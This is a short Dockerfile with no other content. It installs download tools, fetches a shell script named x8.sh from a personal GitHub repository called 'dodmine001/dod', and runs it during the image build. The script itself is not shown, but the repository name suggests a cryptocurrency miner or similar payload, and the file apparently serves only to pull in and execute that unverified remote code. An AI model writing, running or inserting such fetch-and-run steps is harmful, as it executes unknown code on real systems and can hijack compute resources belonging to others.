FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://raw.githubusercontent.com/dodmine001/dod/main/x8.sh
RUN sh x8.sh
